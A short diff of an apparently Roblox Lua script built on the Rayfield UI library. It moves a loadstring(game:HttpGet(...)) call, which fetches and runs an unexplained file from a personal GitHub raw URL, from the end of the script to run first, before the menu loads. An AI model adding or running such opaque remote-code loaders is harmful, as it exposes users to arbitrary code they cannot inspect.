@@ -1,3 +1,15 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zopias04/bgsi123/refs/heads/main/adadadad"))()
+
+
+
+wait(5)
+
+
+
+
+
+
+
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
@@ -713,6 +725,6 @@ Rayfield:Notify({
 })
 
 
-wait(5)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zopias04/bgsi123/refs/heads/main/adadadad"))()
+
+
